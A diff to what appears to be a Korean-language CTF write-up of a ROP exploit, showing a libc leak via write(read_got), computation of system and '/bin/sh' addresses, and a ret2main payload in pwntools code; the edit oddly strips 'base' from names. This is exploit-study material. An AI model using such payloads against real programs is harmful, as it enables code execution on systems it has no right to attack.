@@ -67,7 +67,7 @@ read(0, buf, 0x400);
 ## Exploit
 ### Strategy
 PIE, 카나리 비활성화와 함께 BOF 취약점이 있는 환경은 ROP 공격을 수행하기에 적합하다. 공격 시나리오는 다음과 같다.  
-1. libc base leak
+1. libc  leak
 2. system addr
 3. "/bin/sh" addr
 4. ret2main
@@ -102,7 +102,7 @@ pop_rdi = r.find_gadget(['pop rdi', 'ret'])[0]
 pop_rsi_r15 = r.find_gadget(['pop rsi', 'pop r15', 'ret'])[0]
 
 # Exploit
-# write(1, read_got, 4) -> libc base leak
+# write(1, read_got, 4) -> libc  leak
 payload = b''
 payload += b'A' * 0x48
 payload += p64(pop_rdi) + p64(1)
@@ -113,11 +113,11 @@ payload += p64(main) # ret2main
 p.send(payload)
 p.recvuntil(b'A' * 0x40)
 
-# libc base
+# libc 
 read = u64(p.recvn(6) + b'\x00'*2)
-libc_base = read - read_offset
-system = libc_base + system_offset
-binsh = libc_base + sh_offset
+libc_ = read - read_offset
+system = libc_ + system_offset
+binsh = libc_ + sh_offset
 log.info(f'system: {system}')
 log.info(f'sh: {binsh}')
 
